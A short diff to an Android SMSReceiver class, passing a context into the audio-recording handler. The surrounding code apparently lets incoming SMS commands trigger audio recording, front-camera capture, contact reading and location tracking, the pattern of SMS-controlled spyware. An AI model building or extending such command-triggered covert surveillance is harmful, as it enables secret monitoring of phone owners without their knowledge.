@@ -61,7 +61,7 @@ public class SMSReceiver extends BroadcastReceiver implements OnReceiveLocationL
                     Log.i("contact", "onReceive: num contact"+listContacts.size());
                     break;
                 case 3: //ghi am
-                    RecordHandler recordHandler = new RecordHandler();
+                    RecordHandler recordHandler = new RecordHandler(context);
                     recordHandler.setOnReceiveRecordListener(this);
                     break;
                 case 4: //chup cam truoc
